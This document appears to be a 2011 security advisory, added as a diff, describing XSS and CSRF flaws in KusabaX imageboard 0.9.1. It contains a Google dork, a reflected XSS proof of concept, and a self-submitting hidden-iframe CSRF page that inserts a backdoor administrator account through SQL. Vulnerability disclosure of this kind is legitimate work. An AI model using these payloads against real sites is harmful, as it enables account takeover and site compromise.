@@ -1,0 +1,68 @@
+#######################################################
+#         KusabaX XSS and CSRF Vulnerabilites         #
+#######################################################
+# Product: KusabaX and various Futaba channels clone
+# Vendor site: http://kusabax.cultnet.net/
+# Affected versions: KusabaX <= 0.9.1
+# Product description: an imageboard is a web application written in PHP used in sites 
+# like 4chan as an anonymous bullettin board based on image sharing. 
+# Author: Emilio Pinna - ncl 01 _at_ email _dot_ it
+# Blog site: http://thissecting.wordpress.com
+# Date: 27/04/2011
+
+#######################################################
+#     Cross Site Scripting in 'animation.php'         #
+#######################################################
+# Vulnerable page: animation.php
+# Google dork: allinurl: animation.php board id
+
+File "animation.php" suffer from XSS vulnerabilities in line 47:
+
+#-----------------------------------------------------#
+<param name="pch_file" value="<?php echo KU_BOARDSPATH . '/' . $_GET['board'] . '/src/' . $_GET['id'] . '.pch'; ?>">
+#-----------------------------------------------------#
+
+Attackers can exploit these weaknesses to execute arbitrary HTML and script code 
+in a user's browser session that visit resulting in a cookie stealing and bypass of admin 
+access controls.
+
+#-----------------------------------------------------#
+http://localhost/kusabax/animation.php?board=b&id=1"><script>alert('XSS')</script><"
+#-----------------------------------------------------#
+
+
+
+
+########################################################
+#   Arbitrary SQL statements execution through CSRF    #
+########################################################
+# Vulnerable page: manage_page.php
+
+The vulnerability permit to execute SQL commands through 'SQL query' section of Administrator Panel. 
+This flaw exists due to failure in the 'manage_page.php' script to verify the source of HTTP request 
+with anti CRSF tokens or referrer check. This bug flaw was reported in 2010 for older versions 
+(http://tinyurl.com/5wdrmy6), but never totally fixed. The following example adds an administrator 
+account with login 'new_admin' and password 'admin' encrypted with 'TMC' as salt.
+
+#-----------------------------------------------------#
+INSERT INTO staff VALUES (1331, 'new_admin', '6a9685fcb53b90f0ca9a1c72d7fa31d2', 'TMC', 1, NULL, 1303904817, 1303908333)
+#-----------------------------------------------------#
+
+
+The attacker must lure a logged user with Administrator privilege to a web page with malicious code similar to the 
+following PHP script.
+
+#--------- File: manage_page_sql_crsf.html -----------#
+<html>
+<body>
+<iframe style="width: 1px; height: 1px; visibility: hidden" name="hidden"></iframe>
+  <form method="post" name="sender" action="http://localhost/kusabax/manage_page.php?action=sql" target="hidden">
+  <input type="hidden" name="query" value="insert into staff values (1331, 'new_admin', '6a9685fcb53b90f0ca9a1c72d7fa31d2', 'TMC', 1, NULL, 1303904817, 1303908333)">
+  </form>
+</body>
+<script>document.sender.submit(); </script>
+</html>
+#-----------------------------------------------------#
+
+# Disclosure:
+# 27/04/2011 Reported to KusabaX developers and fixed immediatly with version 0.9.2.
